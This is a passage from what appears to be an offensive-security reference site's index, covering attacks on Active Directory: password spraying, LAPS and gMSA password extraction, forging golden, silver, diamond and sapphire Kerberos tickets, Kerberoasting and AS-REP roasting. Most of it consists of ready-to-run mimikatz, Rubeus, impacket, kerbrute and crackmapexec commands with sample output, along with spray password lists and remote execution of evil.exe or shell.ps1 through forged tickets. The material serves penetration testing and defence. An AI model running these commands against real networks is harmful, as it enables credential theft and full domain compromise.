pathtohashes pathtodico -r myrules.rule --opencl-device-types 1,2\n# Generate a custom mask based on a wordlist\n$ git clone https://github.com/iphelix/pack/blob/master/README\n$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask\n$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask\n</code></pre> <p> If the password is not a confidential data (challenges/ctf), you can use online \"cracker\" like : - hashmob.net - crackstation.net - hashes.com</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ntds-reversible-encryption","title":"NTDS Reversible Encryption","text":"<p><code>UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED</code> (0x00000080), if this bit is set, the password for this user stored encrypted in the directory - but in a reversible form.</p> <p>The key used to both encrypt and decrypt is the SYSKEY, which is stored in the registry and can be extracted by a domain admin. This means the hashes can be trivially reversed to the cleartext values, hence the term \u201creversible encryption\u201d.</p> <ul> <li>List users with \"Store passwords using reversible encryption\" enabled     <pre><code>Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl\n</code></pre></li> </ul> <p>The password retrieval is already handled by SecureAuthCorp/secretsdump.py and mimikatz, it will be displayed as CLEARTEXT. </p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#user-hunting","title":"User Hunting","text":"<p>Sometimes you need to find a machine where a specific user is logged in.   You can remotely query every machines on the network to get a list of the users's sessions.</p> <ul> <li>CrackMapExec   <pre><code>cme smb 10.10.10.0/24 -u Administrator -p 'P@ssw0rd' --sessions\nSMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [+] Enumerated sessions\nSMB         10.10.10.10    445    WIN-8OJFTLMU1IG  \\\\10.10.10.10            User:Administrator\n</code></pre></li> <li>Impacket Smbclient   <pre><code>$ impacket-smbclient Administrator@10.10.10.10\n# who\nhost:  \\\\10.10.10.10, user: Administrator, active:     1, idle:     0\n</code></pre></li> <li>PowerView Invoke-UserHunter   <pre><code># Find computers were a Domain Admin OR a specified user has a session\nInvoke-UserHunter\nInvoke-UserHunter -GroupName \"RDPUsers\"\nInvoke-UserHunter -Stealth\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#password-spraying","title":"Password spraying","text":"<p>Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. </p> <p>The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. </p> <p>Most of the time the best passwords to spray are :</p> <ul> <li><code>P@ssw0rd01</code>, <code>Password123</code>, <code>Password1</code>, <code>Hello123</code>, <code>mimikatz</code></li> <li><code>Welcome1</code>/<code>Welcome01</code></li> <li>$Companyname1 :<code>$Microsoft1</code></li> <li>SeasonYear : <code>Winter2019*</code>, <code>Spring2020!</code>, <code>Summer2018?</code>, <code>Summer2020</code>, <code>July2020!</code></li> <li>Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)</li> <li>Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0)</li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberos-pre-auth-bruteforcing","title":"Kerberos pre-auth bruteforcing","text":"<p>Using <code>kerbrute</code>, a tool to perform Kerberos pre-auth bruteforcing.</p> <p>Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).</p> <ul> <li>Username bruteforce   <pre><code>root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt\n</code></pre></li> <li>Password bruteforce   <pre><code>root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username\n</code></pre></li> <li>Password spray   <pre><code>root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123\nroot@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt\nroot@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#spray-a-pre-generated-passwords-list","title":"Spray a pre-generated passwords list","text":"<ul> <li>Using <code>crackmapexec</code> and <code>mp64</code> to generate passwords and spray them against SMB services on the network.   <pre><code>crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`\n</code></pre></li> <li>Using <code>DomainPasswordSpray</code> to spray a password against all users of a domain.   <pre><code># https://github.com/dafthack/DomainPasswordSpray\nInvoke-DomainPasswordSpray -Password Summer2021!\n# /!\\ be careful with the account lockout !\nInvoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt\n</code></pre></li> <li>Using <code>SMBAutoBrute</code>.   <pre><code>Invoke-SMBAutoBrute -UserList \"C:\\ProgramData\\admins.txt\" -PasswordList \"Password1, Welcome1, 1qazXDR%+\" -LockoutThreshold 5 -ShowVerbose\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#spray-passwords-against-the-rdp-service","title":"Spray passwords against the RDP service","text":"<ul> <li>Using RDPassSpray to target RDP services.   <pre><code>git clone https://github.com/xFreed0m/RDPassSpray\npython3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]\n</code></pre></li> <li>Using hydra and ncrack to target RDP services.   <pre><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10\nncrack \u2013connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#badpwdcount-attribute","title":"BadPwdCount attribute","text":"<p>The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown.</p> <pre><code>$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users\nLDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: &lt;never&gt;\nLDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: &lt;never&gt;\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#password-in-ad-user-comment","title":"Password in AD User comment","text":"<pre><code>$ crackmapexec ldap domain.lab -u 'username' -p 'password' -M user-desc\n$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 -M get-desc-users\nGET-DESC... 10.0.2.11       389    dc01    [+] Found following users: \nGET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in account for guest access to the computer/domain\nGET-DESC... 10.0.2.11       389    dc01    User: krbtgt description: Key Distribution Center Service Account\n</code></pre> <p>There are 3-4 fields that seem to be common in most AD schemas: <code>UserPassword</code>, <code>UnixUserPassword</code>, <code>unicodePwd</code> and <code>msSFU30Password</code>.</p> <pre><code>enum4linux | grep -i desc\nGet-WmiObject -Class Win32_UserAccount -Filter \"Domain='COMPANYDOMAIN' AND Disabled='False'\" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID\n</code></pre> <p>or dump the Active Directory and <code>grep</code> the content.</p> <pre><code>ldapdomaindump -u 'DOMAIN\\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#password-of-pre-created-computer-account","title":"Password of Pre-Created Computer Account","text":"<p>When <code>Assign this computer account as a pre-Windows 2000 computer</code> checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account SERVERDEMO$ would have the password serverdemo. </p> <pre><code># Create a machine with default password\n# must be run from a domain joined device connected to the domain\ndjoin /PROVISION /DOMAIN &lt;fqdn&gt; /MACHINE evilpc /SAVEFILE C:\\temp\\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc\n</code></pre> <ul> <li>When you attempt to login using the credential you should have the following error code : <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>.</li> <li>Then you need to change the password with rpcchangepwd.py</li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#reading-laps-password","title":"Reading LAPS Password","text":"<p>Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure. </p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#determine-if-laps-is-installed","title":"Determine if LAPS is installed","text":"<pre><code>Get-ChildItem 'c:\\program files\\LAPS\\CSE\\Admpwd.dll'\nGet-FileHash 'c:\\program files\\LAPS\\CSE\\Admpwd.dll'\nGet-AuthenticodeSignature 'c:\\program files\\LAPS\\CSE\\Admpwd.dll'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#extract-laps-password","title":"Extract LAPS password","text":"<p>The \"ms-mcs-AdmPwd\" a \"confidential\" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users</p> <ul> <li> <p>From Windows:</p> </li> <li> <p>adsisearcher (native binary on Windows 8+)        <pre><code>([adsisearcher]\"(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))\").findAll() | ForEach-Object { $_.properties}\n([adsisearcher]\"(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))\").findAll() | ForEach-Object { $_.properties}\n</code></pre></p> </li> <li> <p>PowerView <pre><code>PS &gt; Import-Module .\\PowerView.ps1\nPS &gt; Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime\n</code></pre></p> </li> <li> <p>LAPSToolkit <pre><code>$ Get-LAPSComputers\nComputerName                Password                                 Expiration         \n------------                --------                                 ----------         \nexample.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18\n$ Find-LAPSDelegatedGroups\n$ Find-AdmPwdExtendedRights\n</code></pre></p> </li> <li> <p>Powershell AdmPwd.PS        <pre><code>foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}\n</code></pre></p> </li> <li> <p>From Linux:</p> </li> <li> <p>pyLAPS to read and write LAPS passwords:        <pre><code># Read the password of all computers\n./pyLAPS.py --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1\n# Write a random password to a specific computer\n./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1\n</code></pre></p> </li> <li> <p>CrackMapExec:        <pre><code>crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps\n</code></pre></p> </li> <li> <p>LAPSDumper <pre><code>python laps.py -u 'user' -p 'password' -d 'domain.local'\npython laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local' -l 'dc01.domain.local'\n</code></pre></p> </li> <li> <p>ldapsearch       <pre><code>ldapsearch -x -h\u00a0 -D \"@\" -w\u00a0 -b \"dc=&lt;&gt;,dc=&lt;&gt;,dc=&lt;&gt;\" \"(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))\" ms-MCS-AdmPwd`\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#grant-laps-access","title":"Grant LAPS Access","text":"<p>The members of the group \"Account Operator\" can add and modify all the non admin users and groups. Since LAPS ADM and LAPS READ are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password</p> <pre><code>Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain \"domain.local\"\nAdd-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain \"domain.local\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#reading-gmsa-password","title":"Reading GMSA Password","text":"<p>User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#gmsa-attributes-in-the-active-directory","title":"GMSA Attributes in the Active Directory","text":"<ul> <li><code>msDS-GroupMSAMembership</code> (<code>PrincipalsAllowedToRetrieveManagedPassword</code>) - stores the security principals that can access the GMSA password.</li> <li><code>msds-ManagedPassword</code> - This attribute contains a BLOB with password information for group-managed service accounts.</li> <li><code>msDS-ManagedPasswordId</code> - This constructed attribute contains the key identifier for the current managed password data for a group MSA.</li> <li><code>msDS-ManagedPasswordInterval</code> - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.</li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#extract-nt-hash-from-the-active-directory","title":"Extract NT hash from the Active Directory","text":"<ul> <li> <p>GMSAPasswordReader (C#)   <pre><code># https://github.com/rvazarkar/GMSAPasswordReader\nGMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT\n</code></pre></p> </li> <li> <p>gMSADumper (Python) <code>powershell   # https://github.com/micahvandeusen/gMSADumper   python3 gMSADumper.py -u User -p Password1 -d domain.local</code></p> </li> <li> <p>Active Directory Powershell   <pre><code>$gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'\n$blob = $gmsa.'msDS-ManagedPassword'\n$mp = ConvertFrom-ADManagedPasswordBlob $blob\n$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword\n</code></pre></p> </li> <li> <p>gMSA_Permissions_Collection.ps1 based on Active Directory PowerShell module</p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#forging-golden-gmsa","title":"Forging Golden GMSA","text":"<p>One notable difference between a Golden Ticket attack and the Golden GMSA attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.</p> <p> You can't \"force reset\" a gMSA password, because a gMSA's password never changes. The password is derived from the KDS root key and <code>ManagedPasswordIntervalInDays</code>, so every Domain Controller can at any time compute what the password is, what it used to be, and what it will be at any point in the future.</p> <ul> <li>Using GoldenGMSA <pre><code># Enumerate all gMSAs\nGoldenGMSA.exe gmsainfo\n# Query for a specific gMSA\nGoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112\n# Dump all KDS Root Keys\nGoldenGMSA.exe kdsinfo\n# Dump a specific KDS Root Key\nGoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb\n# Compute gMSA password\n# --sid &lt;gMSA SID&gt;: SID of the gMSA (required)\n# --kdskey &lt;Base64-encoded blob&gt;: Base64 encoded KDS Root Key\n# --pwdid &lt;Base64-encoded blob&gt;: Base64 of msds-ManagedPasswordID attribute value\nGoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires privileged access to the domain\nGoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # requires LDAP access\nGoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # Offline mode\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberos-tickets","title":"Kerberos Tickets","text":"<p>Tickets are used to grant access to network resources. A ticket is a data structure that contains information about the user's identity, the network service or resource being accessed, and the permissions or privileges associated with that resource. Kerberos tickets have a limited lifetime and expire after a set period of time, typically 8 to 12 hours.</p> <p>There are two types of tickets in Kerberos:</p> <ul> <li> <p>Ticket Granting Ticket (TGT): The TGT is obtained by the user during the initial authentication process. It is used to request additional service tickets without requiring the user to re-enter their credentials. The TGT contains the user's identity, a timestamp, and an encryption of the user's secret key.</p> </li> <li> <p>Service Ticket (ST): The service ticket is used to access a specific network service or resource. The user presents the service ticket to the service or resource, which then uses the ticket to authenticate the user and grant access to the requested resource. The service ticket contains the user's identity, a timestamp, and an encryption of the service's secret key.</p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dump-kerberos-tickets","title":"Dump Kerberos Tickets","text":"<ul> <li>Mimikatz: <code>sekurlsa::tickets /export</code></li> <li>Rubeus    <pre><code># List available tickets\nRubeus.exe triage\n# Dump one ticket, the output is in Kirbi format\nRubeus.exe dump /luid:0x12d1f7\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#replay-kerberos-tickets","title":"Replay Kerberos Tickets","text":"<ul> <li>Mimikatz: <code>mimikatz.exe \"kerberos::ptc C:\\temp\\TGT_Administrator@lab.local.ccache\"</code></li> <li>CrackMapExec: <code>KRB5CCNAME=/tmp/administrator.ccache crackmapexec smb 10.10.10 -u user --use-kcache</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#convert-kerberos-tickets","title":"Convert Kerberos Tickets","text":"<p>In the Kerberos authentication protocol, ccache and kirbi are two types of Kerberos credential caches that are used to store Kerberos tickets.</p> <ul> <li> <p>A credential cache, or <code>\"ccache\"</code> is a temporary storage area for Kerberos tickets that are obtained during the authentication process. The ccache contains the user's authentication credentials and is used to access network resources without having to re-enter the user's credentials for each request.</p> </li> <li> <p>The Kerberos Integrated Windows Authentication (KIWA) protocol used by Microsoft Windows systems also makes use of a credential cache called a <code>\"kirbi\"</code> cache. The kirbi cache is similar to the ccache used by standard Kerberos implementations, but with some differences in the way it is structured and managed.</p> </li> </ul> <p>While both caches serve the same basic purpose of storing Kerberos tickets to enable efficient access to network resources, they differ in format and structure. You can convert them easily using:</p> <ul> <li>kekeo: <code>misc::convert ccache ticket.kirbi</code></li> <li>impacket: <code>impacket-ticketConverter SRV01.kirbi SRV01.ccache</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#pass-the-ticket-golden-tickets","title":"Pass-the-Ticket Golden Tickets","text":"<p>Forging a TGT require: * the <code>krbtgt</code> NT hash * since recently, we cannot use a non-existent account name as a result of <code>CVE-2021-42287</code> mitigations</p> <p>The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt NT hash must be used.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-mimikatz","title":"Using Mimikatz","text":"<pre><code># Get info - Mimikatz\nlsadump::lsa /inject /name:krbtgt\nlsadump::lsa /patch\nlsadump::trust /patch\nlsadump::dcsync /user:krbtgt\n# Forge a Golden ticket - Mimikatz\nkerberos::purge\nkerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt\nkerberos::tgt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-meterpreter","title":"Using Meterpreter","text":"<pre><code># Get info - Meterpreter(kiwi)\ndcsync_ntlm krbtgt\ndcsync krbtgt\n# Forge a Golden ticket - Meterpreter\nload kiwi\ngolden_ticket_create -d &lt;domainname&gt; -k &lt;nthashof krbtgt&gt; -s &lt;SID without le RID&gt; -u &lt;user_for_the_ticket&gt; -t &lt;location_to_store_tck&gt;\ngolden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck\nkerberos_ticket_purge\nkerberos_ticket_use /root/Downloads/pentestlabuser.tck\nkerberos_ticket_list\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-a-ticket-on-linux","title":"Using a ticket on Linux","text":"<pre><code># Convert the ticket kirbi to ccache with kekeo\nmisc::convert ccache ticket.kirbi\n# Alternatively you can use ticketer from Impacket\n./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da\nticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519\n./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519\nexport KRB5CCNAME=/home/user/ticket.ccache\ncat $KRB5CCNAME\n# NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file\n./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 \n</code></pre> <p>If you need to swap ticket between Windows and Linux, you need to convert them with <code>ticket_converter</code> or <code>kekeo</code>.</p> <pre><code>root@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi\nConverting ccache =&gt; kirbi\nroot@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache\nConverting kirbi =&gt; ccache\n</code></pre> <p>Mitigations: * Hard to detect because they are legit TGT tickets * Mimikatz generate a golden ticket with a life-span of 10 years</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#pass-the-ticket-silver-tickets","title":"Pass-the-Ticket Silver Tickets","text":"<p>Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.</p> <pre><code># Create a ticket for the service\nmimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE\n# Examples\nmimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt\nmimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park\n# Then use the same steps as a Golden ticket\nmimikatz $ misc::convert ccache ticket.kirbi\nroot@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache\nroot@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 \n</code></pre> <p>Interesting services to target with a silver ticket :</p> Service Type Service Silver Tickets Attack WMI HOST + RPCSS <code>wmic.exe /authority:\"kerberos:DOMAIN\\DC01\" /node:\"DC01\" process call create \"cmd /c evil.exe\"</code> PowerShell Remoting CIFS + HTTP + (wsman?) <code>New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC</code> WinRM HTTP + wsman <code>New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC</code> Scheduled Tasks HOST <code>schtasks /create /s dc01 /SC WEEKLY /RU \"NT Authority\\System\" /IN \"SCOM Agent Health Check\" /IR \"C:/shell.ps1\"</code> Windows File Share (CIFS) CIFS <code>dir \\\\dc01\\c$</code> LDAP operations including Mimikatz DCSync LDAP <code>lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt</code> Windows Remote Server Administration Tools RPCSS   + LDAP  + CIFS / <p>Mitigations: * Set the attribute \"Account is Sensitive and Cannot be Delegated\" to prevent lateral movement with the generated ticket.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#pass-the-ticket-diamond-tickets","title":"Pass-the-Ticket Diamond Tickets","text":"<p>Request a legit low-priv TGT and recalculate only the PAC field providing the krbtgt encryption key</p> <p>Require:  * krbtgt NT Hash * krbtgt AES key</p> <pre><code>ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'\nRubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#pass-the-ticket-sapphire-tickets","title":"Pass-the-Ticket Sapphire Tickets","text":"<p>Requesting the target user's PAC with <code>S4U2self+U2U</code> exchange during TGS-REQ(P) (PKINIT).</p> <p>The goal is to mimic the PAC field as close as possible to a legitimate one.</p> <p>Require: * Impacket PR#1411 * krbtgt AES key</p> <pre><code># baduser argument will be ignored\nticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberoasting","title":"Kerberoasting","text":"<p>\"A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. \" - MSDN</p> <p>Any valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.</p> <ul> <li> <p>GetUserSPNs from Impacket Suite   <pre><code>$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request\nImpacket v0.9.17 - Copyright 2002-2018 Core Security Technologies\nServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           \n--------------------  -------------  --------------------------------------------------------  -------------------  -------------------\nactive/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-12-03 17:11:11 \n$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84fd2\n</code></pre></p> </li> <li> <p>CrackMapExec Module   <pre><code>$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt\nLDAP        10.0.2.11       389    dc01           [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False)\nLDAP        10.0.2.11       389    dc01           $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9\n</code></pre></p> </li> <li> <p>Rubeus <pre><code># Stats\nRubeus.exe kerberoast /stats\n-------------------------------------   ----------------------------------\n| Supported Encryption Type | Count |  | Password Last Set Year | Count |\n-------------------------------------  ----------------------------------\n| RC4_HMAC_DEFAULT          | 1     |  | 2021                   | 1     |\n-------------------------------------  ----------------------------------\n# Kerberoast (RC4 ticket)\nRubeus.exe kerberoast /creduser:DOMAIN\\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt\n# Kerberoast (AES ticket)\n# Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.\nRubeus.exe kerberoast /tgtdeleg\n# Kerberoast (RC4 ticket)\n# The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.\nRubeus.exe kerberoast /rc4opsec\n</code></pre></p> </li> <li> <p>PowerView <pre><code>Request-SPNTicket -SPN \"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\"\n</code></pre></p> </li> <li> <p>bifrost on macOS machine   <pre><code>./bifrost -action asktgs -ticket doIF&lt;...snip...&gt;QUw= -service host/dc1-lab.lab.local -kerberoast true\n</code></pre></p> </li> <li> <p>targetedKerberoast <pre><code># for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), \n# print the \"kerberoast\" hash, and delete the temporary SPN set for that operation\ntargetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]\n</code></pre></p> </li> </ul> <p>Then crack the ticket using the correct hashcat mode (<code>$krb5tgs$23</code>= <code>etype 23</code>) </p> Mode Description <code>13100</code> Kerberos 5 TGS-REP etype 23 (RC4) <code>19600</code> Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) <code>19700</code> Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) <pre><code>./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt\n./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt\n</code></pre> <p>Mitigations:  * Have a very long password for your accounts with SPNs (&gt; 32 characters) * Make sure no users have SPNs</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#krb_as_rep-roasting","title":"KRB_AS_REP Roasting","text":"<p>If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting</p> <p>Requirements: - Accounts with the attribute DONT_REQ_PREAUTH (<code>PowerView &gt; Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose</code>)</p> <ul> <li> <p>Rubeus <pre><code>C:\\Rubeus&gt;Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast\n[*] Action: AS-REP roasting\n[*] Target User            : TestOU3user\n[*] 